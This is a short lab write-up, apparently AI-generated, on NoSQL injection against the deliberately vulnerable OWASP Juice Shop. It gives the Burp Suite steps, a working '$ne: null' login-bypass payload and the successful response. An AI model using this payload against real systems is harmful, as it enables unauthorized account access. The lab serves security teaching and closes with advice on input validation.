### Lab 3 – NoSQL Injection (MongoDB REST API)

#### Objective
Demonstrate how improperly handled NoSQL queries can be exploited to bypass authentication via injection of special MongoDB operators.

#### Procedure
1. **Setup:**
   - Run the OWASP Juice Shop application, which uses Node.js and MongoDB backend.
2. **Capture login request using Burp Suite:**
   - Intercept a POST request to the login endpoint, e.g.:  
     ```
     POST /rest/user/login
     Content-Type: application/json
     
     { "email": "admin", "password": "123" }
     ```
3. **Send the intercepted request to Burp Repeater.**
4. **Modify the JSON payload to inject MongoDB query operators:**
   ```json
   {
     "email": { "$ne": null },
     "password": { "$ne": null }
   }
   ```
   Here, `$ne: null` means "not equal to null", which matches any value.
5. **Send the modified request.**

#### Code Result/Output
- The login response shows successful authentication despite wrong credentials, effectively bypassing login.
- Response example:
  ```json
  {
    "authentication": "successful",
    "user": { "email": "admin@juice-sh.op", ... }
  }
  ```
- This confirms the NoSQL injection vulnerability, where the query treats the injected `$ne` operators to bypass normal credential checks.

***

This lab demonstrates that NoSQL databases like MongoDB are vulnerable to injection attacks similar to SQL, requiring proper input validation and query parameterization to prevent injection of operators and unexpected query logic.

Let me know if a step-by-step script or further explanation is needed.
